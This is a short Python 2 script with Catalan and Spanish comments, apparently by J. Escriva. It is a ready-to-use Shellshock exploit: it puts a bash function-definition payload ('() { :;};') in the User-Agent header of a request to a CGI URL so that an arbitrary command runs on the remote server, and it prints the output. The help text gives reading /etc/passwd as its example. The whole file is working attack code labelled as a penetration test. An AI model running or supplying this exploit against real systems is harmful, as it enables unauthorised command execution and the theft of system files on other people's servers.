#!/usr/bin/env python

###############################################################
#
# J.ESCRIVA
# 
# 
#
# Script prepared to get access to a remote host through an existing
# vulnerability in the bash due to the character processing, is achieved 
# through the cgi file
#
###############################################################
import urllib
import sys , optparse
def atac(site,cmd):
	try:
		urllib.FancyURLopener.version = "() { :;}; echo \"Content-Type: text/plain\"; echo; "+cmd
		opener = urllib.FancyURLopener({})
		pageinfo = opener.open(site)
		print pageinfo.read()
	except:
		print "==ERROR== No es pot realitzar la connexio amb el host remot."
def Main():
	print """
	----------------------------------------------------
	|	   shellshock  Test de Penetracion (Python code) |
	|	   Autor: J.Escriva                              |
	----------------------------------------------------
	"""
	parser = optparse.OptionParser("Execucio: "+sys.argv[0]+" \nAtac shellshock: \n-u <url> -c <commandament>")
	parser.add_option('-u',dest='url',type='string',help='URL amb la que fer la connexio.')
	parser.add_option('-c',dest='cmd',type='string',help='commandament a executar al equip remot ,exemple: /bin/cat /etc/passwd')
	(options,args) = parser.parse_args()
	if (options.url != None) | (options.cmd !=None):
		print "Iniciant connexio amb host remot.. "
		print "Resultat:"
		atac(options.url,options.cmd)
	else:
		print parser.usage

if __name__=='__main__':
	Main()



